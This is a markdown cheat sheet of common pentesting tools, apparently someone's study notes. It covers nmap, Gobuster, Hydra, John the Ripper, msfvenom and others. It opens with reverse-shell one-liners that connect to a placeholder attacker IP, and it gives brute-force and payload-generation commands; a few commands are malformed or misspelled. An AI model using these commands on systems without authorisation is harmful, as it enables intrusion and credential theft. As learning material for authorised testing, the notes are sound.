# Pentesting Tools

## 0. How to Obtain a *Reverse Shell*
First, run the following command on your terminal to get a raw tty:
```bash
nc -nlvp {attacker port}
```

This command will listen on the specified port, waiting for the target machine to send a reverse shell.

- Windows
	1. Download netcat
	2. Execute:
```bash
./nc.exe {attacker ip} {nc -nlvp {attacker port} -l cmd.exe
```

- Linux
	1. Execute:
```bash
bash -i >& /dev/tcp/{attacker ip}/{attacker port} 0>&1	
```

Once you have the reverse shell, to make it fully interactive, run:
```bash
script /dev/null -c bash
stty raw -echo; fg
reset xterm
export TERM=xterm
```
Now you can interact with a fully functional tty.

---

## 1. *arp-scan*

The *arp-scan* is used to scan the network (usually local) to discover the target machine's IP.
Common command:
```bash
arp-scan -I {iface} --localnet
```

- **iface** is the network interface to scan.

---

## 2. *nmap*
*nmap* is a versatile tool for port scanning. Some of the most useful scans:
### 2.1. Port Enumeration
First scan to list open ports (you can use extractPorts to copy them easily):
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@IP victim} -oG allPorts
```

Parameters explained:

1. **-p-** → scan all ports
2. **--open** → show only open ports
3. **sS** → stealth SYN scan (which is stealthy because it doesn't do the 3-way handshake)
4. **--min-rate** 5000→ send at least 5000 packets/sec
5. **-vvv** → verbose output
6. **-n** → skip DNS resolution for more velocity
7. **-Pn** → skip host discovery with ping
8. **-oG** allPorts→ save output in greppable format in the file that we specifie (on this case *allPorts*)

Use *extractPorts* to filter relevant ports:
```bash
extractPorts allPorts
```

### 2.2. Detailed Port Scan
After obtaining the list of ports, perform a more thorough scan:
```bash
nmap -sCV -p{copied ports} {@victym ip} -oN targeted
```

Parameters:

1. **-sCV** → the *sC* parameter executes all the *nmap* scripts scan, and the *V* parameters shows also the version of the service that is running.
2. **-p** → specify ports
3. **-oN targeted** → save in normal format for easy reading (on this case to *targeted*)


You now have two files: allPorts (greppable) and targeted (full scan output), that you can simply check whenever you want.
```bash
cat -l ruby targeted
```
Those scans are the basics, in the future we may need to list closed or filter ports...

---

## 3. Searchsploits
Useful for finding known vulnerabilities in services:
```bash
searchsploits {version & service}
```

Always complement with online searches (GitHub, Exploit-DB).

---

## 4. Msfvenom
This tool is used to generate custom payloads for a wide variety of operating systems and architectures. To do this, the first thing to do is list the payloads and filter them using *grep* with keywords. The command to list payloads is as follows:
```bash
msfvenom -l
```

Once we have found the payload that interests us, to save it on our machine we must execute the following command
```bash
msfvenom -p {payload} LHOST={@attacker ip} LPORT={listener port} -f {filetype} -o {filename.extension}
```

---

## 5. Nessus
Another tool for scanning and reporting vulnerabilities is Nessus. Nessus is a service that runs on port 8834 on our computer (localhost) with the HTTPS service. To use it, you must first start the service using
```bash
systemctl start nessusd.service
```

Once it's running, we need to access https://localhost:8834 using a web browser. Once inside Nessus, to start a new scan, press the "New Scan" button in the upper right corner. This will redirect you to a page with a wide selection of possible scans. The most commonly used ones are:

- Advanced Scan → It is a slow scan, but it reports potential vulnerabilities.
- Host Discovery → very basic scan (not that useful)

---

## 6. Burpsuite
Burpsuite is an interception proxy that acts as an intermediary between a website and the attacker, allowing you to manually manage requests and responses. You can access it from the *rofi*, from the terminal with the *"burpsuite"* command, or with the shortcut "Super + shift + b" (on my Kali Linux at least).

---

## 7. Gobuster
Gobuster is a tool that allows you to enumerate directories on a website using a dictionary. This attack is called fuzzing, and it's primarily useful for gathering information. The most commonly used command is the following:
```bash
gobuster dir -w {dictionary} -u {URL} -t {number of threads} -x {extensions}
```

- Dictionary → Dictionary to be used for fuzzing. The most common are:
	- */usr/share/wordlists/dirb/common.txt*
	- */usr/share/wordlsists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt*
- URL → The URL on which the attack will be carried out. For example, http://{victim IP}
- Number of threads → Number of threads used in the attack (to make it faster). For example, 20
- Extensions → The extensions directories can have (html, php, txt, php.bak). For this, it's best to use the SecLists dictionary.

---

## 8. Hash-identifier + John The Ripper
These two tools are often used together. The first, *hash-identifier*, is used to identify the type of hash used to encrypt a string, and *John The Ripper* is used to decrypt it (to use it, you must pass the hash type as a parameter). The commands are as follows:
```bash
hash-identifier
john --format=Raw-{Tipo hash} --wordlist={dictionary} {file with the hash}
```

The dictionary par excellence is *"/usr/share/wordlists/rockyout.txt"*.

---

## 9. Hydra
Hydra is a tool for executing brute-force attacks. For this attack, you need to know the service you're attempting to attack (FTP, SSH, HTTP, etc.), and it's recommended to know one of the two credentials (either username or password), since if you don't know either and execute the brute-force attack with two dictionaries, it can take a long time. Below are the three most common FTP scenarios (to change the service, simply change ftp to the desired service (SSH, HTTP, etc.).
```bash
hydra -l {user} -P {dictionary} ftp://{victym ip}
hydra -L {dictionary} -p {password} ftp://{victym ip}
hydra -L {dictionary} -P {dictionary} ftp://{victym ip} (don't do that, expends a lot of time)
```

---

# 10. Wfuzz
Tool used to list a website's subdomains. The command used is as follows:
```bash
wfuzz -c --nc 400 -t 200 -w <dictionary> -v <domain> -H "HOST: FUZZ.<domain>"
```

Thus, the *wfuzz* command searches for subdomains by changing the word *FUZZ* to the subdomains in the dictionary.

---

# 11. Base64

This is very useful and comes up a lot (it's used a lot). To decode base64 strings, run the following command:
```bash
echo "base64_string" | base64 --decode
```
To encode in base64, execute the following:
```bash
echo "text" | base64
```

---

# 12. WhatWeb
An open-source tool designed to identify technologies used on websites. WhatWeb can detect content management systems (CMS), blogging platforms, statistical analysis packages, JavaScript libraries, web servers, and embedded devices. It can also identify version numbers, email addresses, account IDs, web framework modules, SQL errors, and more. The command used is as follows:

```bash
whatweb http://example.com
```